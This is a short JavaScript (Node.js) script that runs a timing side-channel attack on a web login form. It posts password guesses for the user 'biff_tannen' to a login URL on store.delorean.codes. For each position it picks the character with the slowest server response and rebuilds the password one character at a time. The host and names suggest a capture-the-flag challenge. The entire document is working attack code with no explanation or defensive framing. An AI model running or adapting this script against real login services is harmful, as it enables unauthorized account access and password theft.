const req = require('request');
const assert = require('assert');

const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

assert(chars.length == 62);

function tryPass(pass, cb) {
    const form = {
        username: 'biff_tannen',
        password: pass
    };
    req.post({
        url: 'https://store.delorean.codes/u/ashertrockman/login',
        time: true,
        form: form
    }, (err, res, body) => {
        cb(res.elapsedTime);
    });
}

var soFar = "";

function tryChars(cb) {
    var res = {};

    function tryOne(i) {
        if (i == chars.length)
            return done();

        tryPass(soFar + chars[i], time => {
            res[chars[i]] = time;
            console.log(i);
            tryOne(i + 1);
        });
    }

    tryOne(0);

    function done() {
        console.log(res);
        const values = Object.keys(res).map(x => res[x]);
        const max = Math.max.apply(null, values);
        const indx = values.indexOf(max);
        cb(Object.keys(res)[indx]);
    }
}

function findBest() {
    tryChars(best => {
        soFar += best;
        console.log(soFar);
        findBest();
    });
}

findBest();
